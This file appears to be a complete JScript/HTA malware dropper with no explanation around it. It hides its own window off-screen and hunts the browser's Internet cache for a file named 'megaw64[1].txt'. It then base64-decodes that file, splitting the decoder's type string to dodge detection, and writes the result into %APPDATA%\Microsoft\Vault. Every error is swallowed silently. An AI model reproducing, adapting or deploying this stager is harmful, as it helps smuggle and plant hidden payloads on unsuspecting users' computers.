/////////////////////////////////////////////////////////////////////////////////////////////
//<script language="javascript">

var fso = new ActiveXObject("Scripting.FileSystemObject");
var foundCount = 0;
var shell = new ActiveXObject("WScript.Shell");
var appPath;
var tmpPath;
var sPath;
var sName = "megaw64";

call_main();

function call_main()
{
	try
	{
		window.resizeTo(1,1);
		window.moveTo(5000,5000);
		call_sub();
		window.close();
	}
	catch (e)
	{
		window.close();
	}
	
	return;
}

function sleep(milliseconds) 
{
	var delay = Math.ceil(milliseconds / 1000) + 1;
	shell.Run("ping 127.0.0.1 -n " + delay, 0, true);
}

function call_sub()
{
	try
	{
		sleep(3);
		DeepSearch();
		startCopy();
		runDecoding();
	}
	catch (e)
	{
	}
	
	return;
}

function runDecoding()
{
	try {
		var tPath = shell.ExpandEnvironmentStrings("%APPDATA%");
		var inputPath = sPath;
		appPath = tPath + "\\Microsoft\\Vault";
		var outputPath = appPath + "\\" + sName + ".tmp";

		if (!fso.FileExists(inputPath))
			return;

		var ts = fso.OpenTextFile(inputPath, 1); // 1 = ForReading
		var base64String = ts.ReadAll();
 		ts.Close();
		
		base64String = base64String.replace(/[\r\n\t ]/g, "");

		var xmlDoc = new ActiveXObject("Msxml2.DOMDocument");
		var element = xmlDoc.createElement("tmp");
		var dataType = "bi";
		dataType = dataType + "n.bas";
		dataType = dataType + "e64";
		element.dataType = dataType;
		element.text = base64String;
 		var binaryBuffer = element.nodeTypedValue;

		var adoStream = new ActiveXObject("ADODB.Stream");
		adoStream.Type = 1; // 1 = adTypeBinary
		adoStream.Open();
		adoStream.Write(binaryBuffer);
		adoStream.SaveToFile(outputPath, 2); // 2 = adSaveCreateOverWrite
		adoStream.Close();
		sPath = outputPath;
	} 
	catch (err) {
        }
}

function startCopy()
{
	try {
		var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
		var fileName = sName + "[1]" + ".txt";
		var dPath = tempPath + "\\" + fileName;
		fso.CopyFile(sPath, dPath, true); 
		//shell.popup(sPath, 0, "msg", 64);
		sPath = dPath;
	} 
	catch (e) {
	}
}

function DeepSearch() 
{
	foundCount = 0;
	var fileName = sName + "[1]" + ".txt";
	var shellApp = new ActiveXObject("Shell.Application");
	var cachePath = shellApp.Namespace(32).Self.Path;
	
	recursiveSearch(cachePath, fileName);
}

function recursiveSearch(folderPath, fileName) 
{
	try {
		var folder = fso.GetFolder(folderPath);

                var files = new Enumerator(folder.Files);
                for (; !files.atEnd(); files.moveNext()) {
			var file = files.item();
			if (file.Name.toLowerCase() === fileName.toLowerCase()) {
				sPath = file.Path;
				foundCount++;
			}
                }

                var subFolders = new Enumerator(folder.SubFolders);
                for (; !subFolders.atEnd(); subFolders.moveNext()) {
                    recursiveSearch(subFolders.item().Path, fileName);
		}
	} 
	catch (e) {
	}
}

//</script>
/////////////////////////////////////////////////////////////////////////////////////////////
